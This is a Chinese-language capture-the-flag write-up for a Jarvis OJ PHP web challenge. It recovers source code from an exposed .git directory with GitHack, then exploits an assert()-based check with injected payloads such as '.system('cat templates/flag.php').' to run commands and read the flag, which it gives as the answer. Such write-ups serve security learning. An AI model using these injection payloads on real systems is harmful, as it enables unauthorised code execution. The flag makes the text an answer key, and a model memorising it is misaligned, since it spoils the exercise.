## 描述

题目入口：http://web.jarvisoj.com:32798/

Hint1: 此题缺少关键解题文件的问题已修复。

## 题解

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<title>My PHP Website</title>

		<link rel="stylesheet" href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" />
	</head>
	<body>
		<nav class="navbar navbar-inverse navbar-fixed-top">
			<div class="container">
		    	<div class="navbar-header">
		    		<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
		            	<span class="sr-only">Toggle navigation</span>
		            	<span class="icon-bar"></span>
		            	<span class="icon-bar"></span>
		            	<span class="icon-bar"></span>
		          	</button>
		          	<a class="navbar-brand" href="#">Project name</a>
		        </div>
		        <div id="navbar" class="collapse navbar-collapse">
		          	<ul class="nav navbar-nav">
		            	<li class="active"><a href="?page=home">Home</a></li>
		            	<li ><a href="?page=about">About</a></li>
		            	<li ><a href="?page=contact">Contact</a></li>
						<!--<li ><a href="?page=flag">My secrets</a></li> -->
		          	</ul>
		        </div>
		    </div>
		</nav>

		<div class="container" style="margin-top: 50px">
			<h1 style="text-align: center">欢迎来到我的网站！<br></h1>
<br/>
<p>您可以使用上面的链接浏览页面！</p>
		</div>
		<script src="http://code.jquery.com/jquery-latest.js" />
		<script src="http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js" />
	</body>
</html>
```

`?page=home` 这种操作特别可疑。。是不是能注入。。尝试一下。http://web.jarvisoj.com:32798/?page=gg 得到了

```
That file doesn't exist!
```

没啥用。突然发现注释里有一句 `<!--<li ><a href="?page=flag">My secrets</a></li> -->`，尝试一下 http://web.jarvisoj.com:32798/?page=flag 得到一个空白页面

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<title>My PHP Website</title>

		<link rel="stylesheet" href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" />
	</head>
	<body>
		<nav class="navbar navbar-inverse navbar-fixed-top">
			<div class="container">
		    	<div class="navbar-header">
		    		<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
		            	<span class="sr-only">Toggle navigation</span>
		            	<span class="icon-bar"></span>
		            	<span class="icon-bar"></span>
		            	<span class="icon-bar"></span>
		          	</button>
		          	<a class="navbar-brand" href="#">Project name</a>
		        </div>
		        <div id="navbar" class="collapse navbar-collapse">
		          	<ul class="nav navbar-nav">
		            	<li ><a href="?page=home">Home</a></li>
		            	<li ><a href="?page=about">About</a></li>
		            	<li ><a href="?page=contact">Contact</a></li>
						<!--<li class="active"><a href="?page=flag">My secrets</a></li> -->
		          	</ul>
		        </div>
		    </div>
		</nav>

		<div class="container" style="margin-top: 50px">
					</div>
		<script src="http://code.jquery.com/jquery-latest.js" />
		<script src="http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js" />
	</body>
</html>
```

和前面的区别不大。header 也没看出有啥有用的信息。折腾了一会只能取看题解。

woc？git 泄露？？我当时看到用了 git 我就怀疑是不是这玩意出问题了，但是我尝试的是 http://web.jarvisoj.com:32798/?page=.git 。。。还是太年轻

Git 泄露详细介绍：https://www.freebuf.com/sectool/66096.html

这个故事告诉我们，不要将 .git 部署上去！现成有方便的工具，可以直接 hack，见 https://github.com/lijiejie/GitHack 下载之后直接 `python Githack http://web.jarvisoj.com:32798/.git/` 就得到了这些文件

```
index.php
templates/about.php
templates/contact.php
templates/flag.php
templates/home.php
```

看了下，`template` 文件夹下的文件没啥有用的信息，`flag.php` 只有如下代码

```php
<?php
// TODO
//$FLAG = '';
?>
```

而 `index.php` 为

```php
<?php
if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}
$file = "templates/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("file_exists('$file')") or die("That file doesn't exist!");
?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<title>My PHP Website</title>

		<link rel="stylesheet" href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" />
	</head>
	<body>
		<nav class="navbar navbar-inverse navbar-fixed-top">
			<div class="container">
		    	<div class="navbar-header">
		    		<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
		            	<span class="sr-only">Toggle navigation</span>
		            	<span class="icon-bar"></span>
		            	<span class="icon-bar"></span>
		            	<span class="icon-bar"></span>
		          	</button>
		          	<a class="navbar-brand" href="#">Project name</a>
		        </div>
		        <div id="navbar" class="collapse navbar-collapse">
		          	<ul class="nav navbar-nav">
		            	<li <?php if ($page == "home") { ?>class="active"<?php } ?>><a href="?page=home">Home</a></li>
		            	<li <?php if ($page == "about") { ?>class="active"<?php } ?>><a href="?page=about">About</a></li>
		            	<li <?php if ($page == "contact") { ?>class="active"<?php } ?>><a href="?page=contact">Contact</a></li>
						<!--<li <?php if ($page == "flag") { ?>class="active"<?php } ?>><a href="?page=flag">My secrets</a></li> -->
		          	</ul>
		        </div>
		    </div>
		</nav>

		<div class="container" style="margin-top: 50px">
			<?php
				require_once $file;
			?>
		</div>
		<script src="http://code.jquery.com/jquery-latest.js" />
		<script src="http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js" />
	</body>
</html>
```

注意到 `assert("strpos('$file', '..') === false") or die("Detected hacking attempt!")` 这句话，查了一下 `strpos`，感觉可以拼接一下，但是自己不熟悉 PHP，只能去看题解。

然后发现 woc，这玩意搞一下可以执行任何 PHP 命令？？构造 `$file='.system('ls').'`，意思就是用 `.` 来拼接 `system` 的返回结果，惊呼 woc。

`http://web.jarvisoj.com:32798/?page='.system('ls').'`

返回了

`index.php templates index.php templates That file doesn't exist!`

继续来

`http://web.jarvisoj.com:32798/?page='.system('cat templates/flag.php').'`

得到

```php
<?php
// TODO
//$FLAG = '61dctf{8e_careful_when_us1ng_ass4rt}';
?>
<?php
// TODO
//$FLAG = '61dctf{8e_careful_when_us1ng_ass4rt}';
?>
That file doesn't exist!
```

## 答案

61dctf{8e_careful_when_us1ng_ass4rt}
